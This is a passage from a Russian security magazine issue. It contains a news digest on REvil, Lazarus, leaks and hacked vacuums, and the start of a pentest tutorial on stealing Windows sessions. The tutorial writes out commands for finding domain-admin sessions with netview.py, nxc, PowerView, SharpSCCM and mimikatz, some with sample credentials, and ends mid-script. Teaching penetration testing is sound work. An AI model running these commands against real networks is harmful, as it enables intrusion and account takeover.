  емых участников хакгруппы. Всем им были предъявлены обвинения в совер‐
  шенных организованной группой приобретении и хранении электронных
   средств, предназначенных для неправомерного осуществления перевода
   денежных средств (ч. 2 ст. 187 УК РФ).
      Однако следствие смогло вменить в вину восьми предполагаемым зло‐
   умышленникам лишь два дистанционных хищения средств, к тому же совер‐
  шенных в США неизвестно у кого, где и на какую сумму. СМИ сообщали, что
   потерпевших, равно как и ущерба, в уголовном деле нет.
    В мае 2022 года стало известно, что американские власти отказались
   от дальнейшего сотрудничества с Россией, и обвинить подозреваемых смог‐
  ли только в махинациях с банковскими картами двух живущих в США мек‐
   сиканцев.
    В прошлом году СМИ писали, что дело хакгруппы, по сути, зашло в тупик.
  В окончательной редакции дела всех фигурантов обвинили по 24 эпизодам
   «изготовления и сбыта поддельных кредитных либо расчетных карт»  (ст.
  187 УК РФ), а предполагаемому лидеру группы — жителю Санкт‑Петербурга
   Даниилу Пузыревскому — добавили еще и обвинение по ст. 273 УК РФ, пре‐
   дусматривающей ответственность за «создание или использование компь‐
   ютерных  программ  для  уничтожения  или  блокирования  компьютерной
  информации, а также нейтрализации средств ее защиты».
      Дело в том, что одну из программ, обнаруженную в ноутбуках обвиняемых,
   назначенная следствием экспертиза признала вредоносной.
      Фактически следствие установило, что ни одного преступления в России
  обвиняемые не совершили, а обещанные доказательства их возможной при‐
   частности к финансовым аферам в США Госдепартамент так и не предста‐
   вил.
      Тогда адвокат одного из фигурантов дела заявлял, что ни один из «пред‐
   полагаемых членов REvil» не признаёт как свою связь с группировкой, так
  и причастность к остальным вмененным в вину преступлениям. По словам
   защитника, обвинение в незаконном обороте платежных средств, предъ‐
  явленное в том числе его клиенту, базировалось исключительно на «наборе
  из 24 16-значных чисел», изъятых с сервера в Санкт‑Петербурге.
      Следствие сочло, что в упомянутых строках отражены номера банковских
   карт, которыми обвиняемые дистанционно завладели, сделав их копии.
  При этом, по словам адвоката, следствие не смогло установить владельцев
   карт и даже названия выпустивших их отделений иностранных банков.
      Так, жертвами REvil, по версии следствия, стали две гражданки США мек‐
   сиканского происхождения — некие Otilia Pevez и Otilia Sisniega Pevez. С их
   банковских карт обвиняемые якобы дистанционно похитили некую сумму
   денег, истратив ее на приобретение товаров в интернет‑магазинах. Однако
   найти этих женщин не удалось.
     Что касается обвинения в использовании вредоносных программ, защит‐
  ник счел и его по меньшей мере необоснованным. По его словам, ст. 273 УК
  РФ предполагает уголовную ответственность лишь за использование при‐
   ложений‑вымогателей в корыстных целях, а не за их хранение на жестком
   диске. «Следствие, возможно, перепутало ст. 273 со ст. 222 УК РФ, кара‐
  ющей за сам факт хранения оружия», — отмечал адвокат.
    В  итоге  обвинить  предполагаемых  участников  REvil  удалось лишь
   в незаконном использовании банковских карт и хранении вредоносной прог‐
  раммы. Также не удалось выяснить и происхождение изъятой у обвиняемых
   наличности (426 миллионов рублей, 600 тысяч долларов и 500 тысяч евро),
  а принадлежащую им криптовалюту эксперты даже не взялись оценивать.
     Как сообщили СМИ в конце октября 2024 года, суд признал Заеца,
   Малоземова, Пузыревского и Хансвярова виновными в неправомерном обо‐
  роте средств платежей (ч. 2 ст. 187 УК РФ). Пузыревского и Хансвярова также
   признали виновными в уже упомянутом использовании и распространении
   вредоносных программ (ч. 2 ст. 273 УК РФ).
    В результате Заеца и Малоземова приговорили к 4,5 и 5 годам в колонии
   общего режима, а Хансвяров и Пузыревский получили по 5,5 и 6 лет соот‐
   ветственно.
     Так как обвинения по «делу REvil» были предъявлены восьми людям,
   в отношении еще четверых — Андрея Бессонова, Михаила Головачука,
  Романа Муромского и Дмитрия Коротаева — возбуждено новое уголовное
  дело по статье о неправомерном доступе к компьютерной информации (ст.
  272 УК РФ).
    По информации СМИ, это дело выделено в отдельное производство
  и направлено в Генеральную прокуратуру РФ для последующего соединения
   уголовных дел. При этом, как выяснилось во время процесса, основная часть
   доказательств стороны обвинения строилась на показаниях свидетеля —
   Алексея Скоробогатова, которого правоохранители также связывают с REvil.


  УТЕКЛИ 210 БД РОССИЙСКИХ КОМПАНИЙ

    Эксперты FAССT подсчитали, что за девять месяцев 2024 года на хакфорумах и в Telegram-
   каналах было опубликовано 210 баз с данными клиентов российских компаний. По сравнению
   с аналогичным периодом прошлого года количество слитых баз увеличилось на 37,25%
    (в 2023 году было опубликовано только 153 БД).

    Количество  скомпрометированных  записей  при  этом  выросло  на 7,76%  и  составило
   250,5 миллиона строк. При этом нужно учитывать, что злоумышленники не всегда сообщают
   об успешных атаках, поэтому реальные объемы утечек могут быть больше.


    Интересно, что, согласно статистике Роскомнадзора, с января по сентябрь 2024 года было
   официально зафиксировано только 110 фактов утечек персональных данных. В РКН уточнили,
   что чаще всего утечки происходили у компаний в сфере оказания услуг и торговли.





 DEFI-ИГРА LAZARUS
  В «Лаборатории Касперского» рассказали о сложной кампании северокорей‐
  ской хакгруппы Lazarus. Для атак на пользователей злоумышленники создали
   вредоносный сайт танковой DeFi-игры, в которой якобы можно было получать
   награды в  криптовалюте. Таким способом хакеры  эксплуатировали  уяз‐
  вимость нулевого дня в браузере Google Chrome CVE-2024-4947.
     Все началось с того, что в мае 2024 года эксперты обнаружили новый
   вариант бэкдора Manuscrypt на машине одного из клиентов в России.
  Manuscrypt  представляет собой  полнофункциональный  бэкдор, который
   Lazarus применяет как минимум с 2013 года.
    Он использовался более чем в 50 уникальных кампаниях, направленных
  на  правительственные учреждения,  дипломатические ведомства, финан‐
  совые институты, подрядчиков в сфере ВПК, криптовалютную индустрию, IT-
  и телекоммуникационные компании, разработчиков игр, СМИ, казино, уни‐
   верситеты, ИБ‑исследователей и так далее.
     Так как Lazarus редко атакует физических лиц, это вызвало интерес у спе‐
   циалистов, и они решили изучить этот случай более внимательно. Выяс‐
   нилось, что заражению предшествовала атака на 0-day-уязвимость в браузе‐
  ре Chrome.
      Оказалось,  что  эксплуатация  уязвимости  уходила  корнями  к  сайту
   detankzone[.]com (в настоящее время заблокирован), на котором рекламиро‐
  валась основанная на NFT танковая MOBA-игра под названием DeTankZone.
    На  сайте  пользователям предлагали  скачать пробную версию игры,
   в основе которой лежала модель play-to-earn. Суть игры заключалась в сра‐
   жениях на виртуальных NFT-танках с соперниками по всему миру, за что яко‐
  бы можно было получать награды в криптовалюте. При этом игру действи‐
   тельно можно было запустить, однако все переставало работать после экра‐
  на входа/регистрации, поскольку внутренняя инфраструктура была отклю‐
   чена.
      Интересно,  что  в   итоге   исследователи  нашли  реальную  игру
   (DeFiTankLand), которая, по всей видимости, послужила прототипом для вре‐
   доносной версии. Хакеры практически полностью повторили ее дизайн: отли‐
  чия заключались лишь в расположении логотипа и более низком качестве
   визуального оформления. Предполагается, что за основу был взят украден‐
  ный исходный код и атакующие лишь заменили логотипы и убрали все
  отсылки к реальной игре.
      Участники Lazarus несколько месяцев рекламировали DeTankZone в соци‐
   альных сетях, фишинговых письмах и с премиум‑аккаунтов в LinkedIn, которые
   использовались для прямых атак на конкретных пользователей. Также они
  пытались привлечь для рекламы игры инфлюенсеров из сферы криптовалют,
  а затем предположительно предпринимали попытки атаковать и их аккаунты.
    При этом игра была только прикрытием и не являлась вредоносной сама
  по себе. А вот сайт DeTankZone содержал скрытый скрипт (index.tsx), который
   позволял загрузить и выполнить эксплоит для Chrome. То есть для заражения
   устройства было достаточно просто зайти на сайт, начинать и запускать саму
   игру не требовалось.


                                        Продолжение статьи →
← Начало статьи





                      Главная страница сайта с вредоносным скриптом

   Эксплоит содержал код для двух уязвимостей: первая используется для чте‐
  ния памяти процесса Chrome и записи в нее с помощью JavaScript, а вто‐
  рая — для обхода песочницы V8.
     Одной из этих уязвимостей была 0-day CVE-2024-4947, представляющая
  собой  ошибку  несоответствия  используемых  типов  данных  в  движке
  V8 от Google на открытом исходном коде JavaScript и WebAssembly. Она поз‐
  воляла получить контроль над устройством жертвы: выполнять произвольный
   код, обходить защитные функции и осуществлять вредоносную активность.
      После того как «Лаборатория Касперского» сообщила об уязвимости
   представителям Google, проблема была устранена в мае 2024 года.
     Шелл‑код, который затем использовался Lazarus, служил в качестве инс‐
   трумента  разведки, помогая хакерам  определить  ценность  взломанной
  машины и решить, стоит ли продолжать атаку далее. Код собирал информа‐
  цию о процессоре, BIOS и ОС, выполнял антивирусные и антиотладочные
   проверки и отправлял собранные данные на управляющий сервер злоумыш‐
   ленников.
      Изучить последующие шаги хакеров не удалось, так как на момент про‐
   ведения анализа группировка уже удалила эксплоит с сайта‑приманки.


 НОВЫЙ DDOS-РЕКОРД

   Компания Cloudflare сообщила, что недавно отразила DDoS-атаку, которая установила новый
   рекорд.


   По словам главы Cloudflare Мэттью Принса (Matthew Prince), пиковая мощность атаки достигла
   3,8 Тбит/с и 2,14 миллиарда пакетов в секунду (PPS). Атака была направлена на неназ‐
   ванного клиента неназванного хостинг‑провайдера, который пользуется услугами Cloudflare.





   Предыдущий рекорд в этой области был установлен еще в конце 2021 года, когда компания
   Microsoft зафиксировала атаку мощностью 3,47 Тбит/с и 340 миллионов PPS.

   Новая рекордная атака длилась почти месяц и состояла более чем из 100 отдельных гиперобъ‐
   емных (hyper-volumetric) DDoS-атак. Многие из них были направлены на сетевую инфраструк‐
   туру цели (L3 и L4), а их мощность превышала 2 миллиарда PPS и 3 Тбит/с.





   Зараженные устройства, с которых велась атака, были разбросаны по всему миру и находились
   в России, Вьетнаме, США, Бразилии и Испании.





 КЛЮЧИ В КОДЕ
   Многие популярные приложения для iOS и Android содержат жестко закоди‐
   рованные, незашифрованные учетные данные для облачных сервисов, вклю‐
   чая Amazon Web Services (AWS) и Microsoft Azure Blob Storage, предупредили
   в Symantec.
      Исследователи объясняют, что утечка таких ключей может дать злоумыш‐
   ленникам несанкционированный доступ к хранилищам и базам данных с кон‐
   фиденциальными данными и в целом является грубым нарушением безопас‐
   ности. При этом отмечается, что в основном ключи попадают в кодовые базы
   приложений из‑за ошибок, халатности и плохих практик разработчиков.

         «Это  опасная  ситуация,  ведь  любой  человек,  имеющий  доступ
          к бинарному или исходному коду приложений, сможет извлечь эти «
          учетные данные и использовать их для манипулирования данными
        или  их  кражи,  что  приведет  к  серьезным  нарушениям  безопас-
          ности», — говорят специалисты.                 »
   Эксперты обнаружили учетные данные от облачных сервисов в следующих
   приложениях в магазине Google Play:
   • Pic Stitch (более 5 миллионов загрузок) — жестко закодированные учет‐
     ные данные Amazon;
   • Meru Cabs (более 5 миллионов загрузок) — жестко закодированные
      учетные данные Amazon;
   • ReSound Tinnitus Relief (более 500 тысяч загрузок) — жестко закоди‐
     рованные учетные данные Microsoft Azure Blob Storage;
   • Saludsa (более 100 тысяч загрузок) — жестко закодированные учетные
      данные Microsoft Azure Blob Storage;
   • Chola Ms Break In (более 100 тысяч загрузок) — жестко закодирован‐
     ные учетные данные Microsoft Azure Blob Storage;
   • EatSleepRIDE Motorcycle GPS (более 100 тысяч загрузок) — жестко
      закодированные учетные данные Twilio;
   • Beltone Tinnitus Calmer (более 100 тысяч загрузок) — жестко закоди‐
     рованные учетные данные Microsoft Azure Blob Storage.

   Аналогичная проблема была найдена и в ряде популярных приложений
   в Apple App Store:
   • Crumbl (более 3,9 миллиона оценок) — жестко закодированные учетные
      данные Amazon;
   • Eureka: Earn money for surveys (более 402,1 тысячи оценок) — жестко
      закодированные учетные данные Amazon;
   • Videoshop — Video Editor (более 357,9 тысячи оценок) — жестко
      закодированные учетные данные Amazon;
   • Solitaire Clash: Win Real Cash (более 244,8 тысячи оценок) — жестко
      закодированные учетные данные Amazon;
   • Zap Surveys — Earn Easy Money (более 235 тысяч оценок) — жестко
      закодированные учетные данные Amazon.

   Стоит отметить, что App Store не указывает данные о количестве загрузок,
  но обычно их количество превышает указанное количество оценок.
      Исследователи пишут, что установка таких приложений, конечно, не озна‐
   чает автоматическую компрометацию устройства, однако существует риск
   того, что хакеры завладеют конфиденциальными данными пользователей,
  если разработчики не примут меры и не устранят проблему.
    В Symantec не в первый раз предупреждают об этой опасности. Так,
  еще в 2022 году исследователи писали, что обнаружили более 1800 при‐
   ложений для iOS и Android, в коде которых содержатся учетные данные AWS.
   Причем в 77% случаев это были действительные токены доступа.


  6 200 000 «СЕРЫХ» SIM-КАРТ ЗАБЛОКИРОВАЛИ
 С НАЧАЛА ГОДА
  В Роскомнадзоре (РКН) сообщили, что с начала года было заблокировано 456 миллионов
   мошеннических звонков. При этом в ведомстве отметили, что для таких звонков и сообщений
    преступники части используют «серые» SIM-карты без установленного владельца.

   По данным РКН, с ноября 2023 года по сентябрь 2024 года было выявлено 93,9 миллиона
   нарушений в достоверности сведений об абонентах. Из них 85,7 миллиона нарушений уже
   исправлены — операторы внесли корректные данные.

    Также 6,2 миллиона SIM-карт, оформленных с нарушениями, были заблокированы, либо
   договоры по ним были расторгнуты. А еще 2 миллиона SIM-карт по‑прежнему проходят про‐
    верку.





 КРИПТОВАЛЮТА ФБР
   Американские власти заявили, что некоторое время назад ФБР создало
   собственную  криптовалюту, которая использовалась для  расследования
   манипулирования ценами на крипторынках. Отмечается, что созданный ФБР
   Ethereum-токен и  одноименная  компания NexFundAI были  разработаны
  при поддержке свидетелей, содействующих следствию.
     NexFundAI рекламировалась как проект, находящийся «на пересечении
   финансов и искусственного интеллекта». Ее целью якобы было «создание
   криптовалютного токена, который не только послужит надежным средством
   сбережения, но и выступит в качестве катализатора позитивных изменений
   в сфере ИИ».


         «Три маркет‑мейкера — ZM Quant, CLS Global и MyTrade — и их сот-
          рудники обвиняются в том, что они участвовали в „отмывочной“ тор- «
         говле (wash trade) и/или вступили в сговор с целью осуществления
          „отмывочной“  торговли от имени NexFundAI,  криптовалютной ком-
        пании и токена, созданного по указанию правоохранительных органов
         в рамках правительственного расследования. Четвертый маркет‑мей-
          кер, компания Gotbit, а также ее CEO и два директора также обви-
          няются в участии в аналогичной схеме», — сообщает Министерство
         юстиции США.                 »
  Термином wash trade обычно обозначают форму манипулирования рынком,
   когда участники рынка создают искусственную активность, одновременно
   продавая и покупая одни и те же активы.
    В общей сложности расследование затрагивает 18 человек и организа‐
   ций. При этом пять человек либо уже признали свою вину, либо согласились
   признать ее в будущем. Сообщается, что еще трое обвиняемых арестованы
   в США, Великобритании и Португалии.
     Эта операция правоохранителей получила название Token Mirrors. Бла‐
   годаря NexFundAI было конфисковано более 25 миллионов долларов в крип‐
   товалюте и отключены многочисленные торговые боты, стоящие за вош‑трей‐
   дингом.
      Согласно судебным документам, обвиняемые проводили фиктивные сдел‐
   ки с использованием собственных токенов, чтобы создать впечатление, что
   это хорошие инвестиции, тем самым привлекая новых инвесторов и покупа‐
  телей и искусственно завышая торговые цены. Затем подозреваемые про‐
   давали свои токены по новым ценам, действуя в рамках классической схемы
  pump-and-dump.

       «ФБР пошло на беспрецедентный шаг — создало собственный крип-
         товалютный токен и компанию, чтобы выявить, пресечь и привлечь «
          к ответственности этих предполагаемых мошенников», — сообщили
         в ФБР.                 »

 ВЗЛОМ DRM DENUVO

   Специалист  Университета Северной Каролины в Чапел‑Хилле  Уильям Фолькман  (William
   Volckmann) опубликовал работу, посвященную взлому защиты Denuvo и влиянию пиратства
   на доходы игровой индустрии.

   Оказалось, взлом DRM-защиты практически не влияет на продажи игр уже через 12 недель
    после их релиза.

   Для своего исследования эксперт использовал выборку из 86 игр с защитой Denuvo, исходно
   выпущенных в Steam в период с сентября 2014 года по конец 2022 года.


   Потери издателей игр от взлома Denuvo напрямую зависят от того, как быстро появляется кряк.
   По данным Фолькмана, игра с защитой Denuvo, взломанная в первую неделю после релиза,
   может принести издателю на 20% меньше доходов.

   Но если кряк появляется через шесть недель после релиза игры, это лишает издателя лишь
  5% от теоретического дохода. Через 12 недель новые продажи игры и вовсе становятся нас‐
    только незначительными, что «разработчики уже могут удалить непопулярные механизмы DRM
   с минимальными потерями».





      Чем дольше действует DRM-защита игры, тем меньше появление кряка влияет на новые продажи


  В среднем игры с защитой Denuvo практически не теряют в продажах из‑за пиратства, пос‐
    кольку защита «чаще всего остается невзломанной» в течение первых 12 недель.





 АГРЕССИВНЫЕ
 ПЫЛЕСОСЫ
  В мае  текущего года в  разных городах США  произошла серия  атак
  на роботы‑пылесосы Ecovacs Deebot X2. Хакеры использовали уязвимости,
   чтобы  удаленно управлять пылесосами, получать  доступ  к их камерам
  и встроенным динамикам, оскорблять владельцев устройств и преследовать
  домашних животных.
     Одним из пострадавших был юрист из Миннесоты Дэниел Свенсон (Daniel
   Swenson). Он  рассказал СМИ, что смотрел телевизор с семьей,  когда
  робот‑пылесос вдруг стал издавать странные звуки, похожие на сломанное
  радио.
      Войдя в приложение, Свенсон обнаружил, что устройство удаленно кон‐
   тролирует посторонний человек, наблюдая за происходящим через камеру
   пылесоса. Попытка сброса пароля и перезагрузки устройства не помогла:
  через некоторое время пылесос  снова  активировался, но на этот раз
  из динамика раздался человеческий голос, который стал выкрикивать расист‐
  ские оскорбления в адрес Свенсона и его 13-летнего сына.
      Пострадавший  отмечает,  что  атакующий,  похоже, был  подростком,
  который просто переключался с устройства на устройство, чтобы поиздевать‐
  ся над людьми.
    В итоге Свенсон был вынужден отключить робот‑пылесос и убрать его
   подальше. Дело в том, что раньше пылесос работал на одном этаже с хозяй‐
  ской спальней. «Наши младшие дети принимают там душ, — объясняет Свен‐
   сон. — Я просто подумал, что он мог застать моих детей или даже меня, когда
  мы неодеты». По его словам, ситуация могла быть гораздо хуже, если бы
  хакеры решили тихо следить за его семьей, не афишируя свое присутствие.
      Другие случаи атак на пылесосы Ecovacs произошли в Лос‑Анджелесе
  и Эль‑Пасо через несколько дней после атаки на устройство Свенсона. Так,
   в Лос‑Анджелесе робот‑пылесос гонялся по дому за собакой, и хакер
  при этом выкрикивал оскорбления через динамик. Устройство в Эль‑Пасо
  тоже использовалось для трансляции расистских заявлений хакера, пока вла‐
  делец не отключил пылесос.
     Как оказалось, в прошлом году ИБ‑исследователи выявили уязвимость
   в роботах‑пылесосах Ecovacs, которая позволяла обойти ввод PIN-кода
   в модели Deebot X2 и получить полный контроль над устройством, включая
   доступ к камере и функциям удаленного управления. Специалисты расска‐
   зывали об этой проблеме на конференции Chaos Communication Congress.
      Также недавно журналисты ABC News Australia сообщали, что в устрой‐
   ствах Ecovacs был обнаружен другой баг, который тоже позволял захватить
   контроль над  пылесосом.  Однако  эта  уязвимость  связана с  Bluetooth
  и работает лишь на расстоянии около ста метров от робота‑пылесоса, то
   есть вряд ли имела отношение к описанным выше атакам.
      Когда о взломах устройств Ecovacs заговорили СМИ, представители ком‐
  пании заверили, что проблема, из‑за которой владельцы пылесосов серии
  X2 столкнулись со взломами, уже устранена. Еще одно обновление прошив‐
   ки, для «дальнейшего повышения безопасности», должно выйти в середине
   ноября 2024 года.
    В компании подчеркнули, что «нет никаких свидетельств того, что имена
   пользователей и пароли были  получены  неавторизованными  третьими
  лицами в результате компрометации систем Ecovacs».
      Однако пострадавшие и исследователи критикуют компанию за мед‐
  ленную реакцию. К примеру, Свенсон рассказал журналистам, что, когда он
   обратился в поддержку Ecovacs и попытался уведомить компанию о том, что
   кто‑то взломал его пылесос и выкрикивает оскорбления, ему не поверили.
  В компании спрашивали, нет ли у него видеозаписи произошедшего, нес‐
  мотря на то что в это время другие пользователи уже обращались в поддер‐
   жку с похожими жалобами.
      Затем служба поддержки предположила, что хакеры могли получить дос‐
   туп к его устройству при помощи атаки типа credential stuffing. Этим термином
   обычно обозначают ситуации, когда учетные данные похищаются с одних сай‐
   тов и сервисов, а затем используются в других. Потом Свенсона уведомили
  о том, что проведенное  расследование  показало, что  «учетная запись
  Ecovacs и ее пароль были получены неуполномоченным лицом».
      Однако даже этого было бы недостаточно для полной компрометации
   робота‑пылесоса, который также должен быть защищен упомянутым выше
   PIN-кодом.
      Стоит отметить, что специалисты, исходно обнаружившие уязвимость PIN-
  кодов и рассказавшие о ней на CCC, заявили, что разработчики Ecovacs
  до сих пор не устранили эту проблему полностью.


  ДРУГИЕ ИНТЕРЕСНЫЕ СОБЫТИЯ МЕСЯЦА

    Количество атак SpyNote на Android-устройства в России выросло в 4,5 раза


    Fortinet обвинили в сокрытии информации о критическом RCE-баге


   Против создателей UAPS и Cryptex возбудили уголовное дело


    Продукты «Лаборатории Касперского» удалили из Google Play Store


  В OpenAI рассказали, как хакеры злоупотребляют ChatGPT


  В открытом доступе опубликованы данные пользователей «Бургер Кинга»


   Баг в Kubernetes Image Builder позволял получить root-доступ через SSH


   На Pwn2Own Ireland 2024 показали более 70 0-day-уязвимостей


   Хакеры используют Steam, YouTube и X для координации атак


   Cisco отключила портал DevHub из‑за заявлений хакера
COVERSTORY





Как  часто ты видишь  заветную  сессию
доменного  администратора  на  дырявой
«семерке»? Его учетная запись так и про‐
сится в руки  злоумышленника или  пен‐
тестера, и дальше она поможет захватить         MichelleVermishelle                                                                                       @Michaelzhm
всю  сетку. Однако злой антивирус ни в        michael.zhmailo@yandex.ru
какую не дает сдампить LSASS. Что пен‐
тестеру   делать   в   таком    случае?
Как получить сессию пользователя, обойдя
все защитные средства?


В Windows при входе пользователя в систему ему назначается собственная
сессия. Глубоко‑глубоко внутри процесса lsass.exe хранится сопоставле‐
ние между сессией и учетными данными пользователя. При попытке пройти
аутентификацию на стороннем хосте, ресурсе или службе LSA получает иден‐
тификатор конкретной сессии, обнаруживает связь между сессией и конкрет‐
ными учетными данными, после чего проводит аутентификацию.


           WARNING

                        Статья имеет ознакомительный характер и пред‐
                          назначена для специалистов по безопасности,
                          проводящих тестирование в рамках  контракта.
                       Автор  и  редакция  не  несут  ответственности
                        за любой вред,  причиненный с  применением
                          изложенной информации. Распространение вре‐
                         доносных программ, нарушение работы систем
                      и  нарушение  тайны  переписки  преследуются
                      по закону.


Подробно механизм аутентификации пользователей, принцип работы LSA
и общую структуру сессий мы изучали в статье «Поставщик небезопасности.
Как Windows раскрывает пароль пользователя». Сейчас же предлагаю поз‐
накомиться с механизмом кражи сессий.
   Если вкратце: почти все способы кражи сессий позволяют немножко зло‐
употребить механизмом сопоставления сессии и учетных данных и начать
исполнять какие‑нибудь  нелегитимные  действия  от лица  пользователя,
на чью сессию мы можем воздействовать.





                    Общий концепт кражи сессии




                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ
  ВРЕШЬ, НЕ УЙДЕШЬ!
                    КАК РАБОТАЕТ УГОН
          ПОЛЬЗОВАТЕЛЬСКИХ СЕССИЙ
                        В WINDOWS





ПОИСК СЕССИЙ ПОЛЬЗОВАТЕЛЕЙ

Первым делом нам нужно найти компьютер, на котором могут лежать инте‐
ресные сессии пользователей. Здесь мы можем на выбор использовать:
 • функции WinAPI, которые позволяют перечислять сессии на устройстве;
 • поведение системы — например, можем смотреть, появляются ли опре‐
   деленные артефакты, которые свидетельствуют о наличии сессии поль‐
   зователя на хосте;
 • особенности AD, которые помогут нам раскрыть списки пользователей
   на хосте.


WinAPI
Начнем с самого простого варианта — WinAPI. Здесь много полезных нам
функций. Я выделю эти:
 • NetSessionEnum();
 • NetWkstaUserEnum();
 • WinStationEnumerateW().

Начнем с первой. У нее много аргументов, которые неплохо документирова‐
ны в MSDN.


NET_API_STATUS NET_API_FUNCTION NetSessionEnum(
  [in]      LMSTR   servername,
  [in]      LMSTR   UncClientName,
  [in]      LMSTR   username,
  [in]      DWORD   level,
  [out]     LPBYTE  *bufptr,
  [in]      DWORD   prefmaxlen,
  [out]     LPDWORD entriesread,
  [out]     LPDWORD totalentries,
  [in, out] LPDWORD resume_handle
);

Единственное, на что нам стоит обратить внимание, — первый параметр, он
как раз таки и отвечает за компьютер, с которого будет получена информация
о сессиях. Причем существует аналог этой функции, но поверх RPC —
NetrSessionEnum().
  С использованием этого метода работает большинство инструментов
для обнаружения сессий пользователя. Например, если мы работаем с хоста
на Linux, то можно воспользоваться скриптом netview.py (вот, кстати, вызов
метода NetrSessionEnum()).


python3 netview.py DOMAIN/Administrator:lolkekcheb123! -target 10.10.
10.10

Параметр -target — это устройство, с которого следует собирать информа‐
цию о сессиях.





                        Пример использования

Инструмент имеет более инвазивные функции: с его помощью можно отсле‐
живать сессии по всему домену. В таком случае список пользователей,
которых ищем, указываем через -users.





                       Поиск сессии по всему домену

Чуть более урезанные возможности — у netexec. Получить список поль‐
зователей через него можно, указав флаг --loggedon-users.


nxc smb 10.10.10.10/24 -u admin -p admin --loggedon-users





                        Пример использования

Наконец, BloodHound собирает информацию о сессиях точно таким же обра‐
зом. Впрочем, если мы работаем с Windows, то описанные выше варианты
неприменимы. Поэтому можно посмотреть в сторону LOLBAS. Например,
net.


net session [\\compname] [/list]

Либо quser.


quser.exe /server:dc01.office.corp


# Аналог 1 в 1
qwinsta.exe /server:dc01.office.corp


# Аналог 1 в 1, часть 2 :)
query.exe user /server:W10.ad.bitsadmin.com





                       Изучение с системы Windows

Еще существует подписанный Microsoft инструмент PsLoggedon.


psloggedon \\ dc01





                    Использование легитимного бинаря

Наконец, есть полноценные фреймворки на  PowerShell, например Get-
UserSession2.ps1, BOF для Cobalt Strike Get-NetSession и, конечно же, всеми
любимый Invoke-UserHunter из пакета PowerView.


Invoke-UserHunter -GroupName "Domain Admins"
Invoke-UserHunter -CheckAccess # Проверить административный доступ
Invoke-UserHunter -Domain "dev.corp" -UserName admin # Найти, где
сейчас находится такой-то юзер


# Есть флаг -Stealth, который уменьшает шансы на успех, но проверяет
лишь машины с высокой ценностью

Если же вызов NetSessionEnum() заблокирован или по какой‑то иной при‐
чине  не  срабатывает,  то  можно  поискать  альтернативы.  Например,
getloggedon.py.


python getloggedon.py VOSTOK/dcom:lolkekcheb123\!@192.168.137.139





                     Пример перечисления сессий

Собственно, вызов с системы Windows можно сделать через PowerView.


Get-NetLoggedon -ComputerName HOME-PC


# Сбор сразу со всех компьютеров в домене
Get-DomainComputer | Get-NetLoggedon





                            Вывод PowerView

Наконец, пришла очередь WinStationEnumerateW(). Я не видел вариантов
этого вызова на Python, есть на C++ с подробным разбором от автора. PoC
можешь найти в его репозитории.


Реестр
Этот способ обнаружения сессий пользователя основывается на том, что
при логоне юзера создается ветка в HKCU_USERS. Так можно обнаруживать
новых пользователей в системе. Конечно, в ход могут пойти стандартные ути‐
литы reg.exe и reg.py, но мастера давно создали полноценные инструменты.
  Для Windows есть Invoke-SessionHunter.


Invoke-SessionHunter





                           Invoke-SessionHunter

А также модуль LoggedOn инструмента SharpHound. В Linux можно исполь‐
зовать питоновский скрипт LoggedOn.py.


python loggedon.py VOSTOK/dcom:lolkekcheb123\!@192.168.137.139





                        Использование LoggedOn.py


Через SCCM
В SCCM (который не всегда развернут в AD!) есть интересная фича, которая
называется Primary User. Она позволяет отслеживать, какие пользователи
какие машины используют. Так что мы можем устроить настоящую охоту!
Однако для использования нужно пробить SCCM-сервер.
   Например, можно провести рекон через MalSCCM.





                    Пример использования MalSCCM

Есть также SharpSCCM. Он тоже позволяет обнаружить компы, на которых
сидит определенный пользователь.


.\SharpSCCM.exe get primary-users -u Frank.Zapper

Причем поддерживается и обратная операция — получение списка поль‐
зователей, которые ходят на определенный компьютер.


SharpSCCM.exe get primary-users -sms <SMS_PROVIDER> -sc <SITECODE> -d
 CLIENT --no-banner





                        Использование SharpSCCM

Здесь видно, что пользователь mayyhem\sccmadmin ходит на CLIENT.


Через RDP-сессии
Этот вариант поиска сессий пользователей сработает, если в сети предпри‐
ятия активно используется RDP. В таком случае в Linux удобно дергать тулзу
tstool.py.


python3 tstool.py CRINGE/Administrator:lolkekcheb123\!@192.168.116.
129 qwinsta





                          Использование tstool.py

А в Windows нам поможет любимый Mimikatz с его модулем ts::sessions.


mimikatz.exe "ts::sessions /server:W10.ad.bitsadmin.com" exit


Логи
Не стоит игнорировать и файлы логов, ведь при входе любого пользователя
генерируется много интересных событий. Именно этот способ можно считать
наиболее тихим вариантом поиска сессий пользователей.
  Я выделил событие 4624 — An account was successfully logged on, оно
генерируется на хосте, на который зашел пользователь. При аутентификации,
например через Kerberos, на контроллере домена будет событие 4624,
но источником будет считаться тот хост, на котором проходила аутентифика‐
ция. В таком случае перед нами следствие запроса, а не факт аутентифика‐
ции.  Также в этом событии  зачастую содержится IP-адрес  устройства,
с которого запрашивалась аутентификация.





                      Как выглядит событие 4624

Для анализа события можно накидать небольшой скрипт на PowerShell. Нап‐
ример, пусть мы хотим определить, на какие машины пользователь «Адми‐
нистратор»  ходил  в  последний  раз. В  таком  случае  нам  поможет
событие 4624 и атрибут LastLogon, по которому будем делать фильтрацию,
чтобы не анализировать все события 4624 на хосте.


param(
    [Parameter(Mandatory=$true)]
    [string]$ComputerName ,
    [Parameter(Mandatory=$true)]
    [string]$UserName
)


try {
    Import-Module ActiveDirectory
    $user = Get-ADUser -Identity $UserName -Properties
"lastLogonTimestamp"
    $lastLogonDate = [DateTime]::FromFileTime($user.
lastLogonTimestamp)
    $startDate = $lastLogonDate.Date
    $endDate = $lastLogonDate.AddDays( 1).Date


    $filterHashtable = @{
        LogName = "Security"
        ID = 4624
        StartTime = $startDate
        EndTime = $endDate
    }
    $events = Get-WinEvent -ComputerName $ComputerName
-FilterHashtable $filterHashtable



    foreach ($event in $events) {
        $xmlEvent = [ xml]$event.ToXml()


        $targetUserSid = ($xmlEvent.Event.EventData.Data | Where-
Object { $_.Name -eq 'TargetUserSid' }) .'#text'
        $targetUserName = ($xmlEvent.Event.EventData.Data | Where-
Object { $_.Name -eq 'TargetUserName' }) .'#text'


        if (-not [string]::IsNullOrEmpty($UserName) -and $UserName
-ne $targetUserName) {
            continue
        }


        $targetDomainName = ($xmlEvent.Event.EventData.Data | Where-
Object { $_.Name -eq 'TargetDomainName' }) .'#text'
        $logonType = ($xmlEvent.Event.EventData.Data | Where-Object {
$_.Name -eq 'LogonType' }) .'#text'
        $ipAddress = ($xmlEvent.Event.EventData.Data | Where-Object {
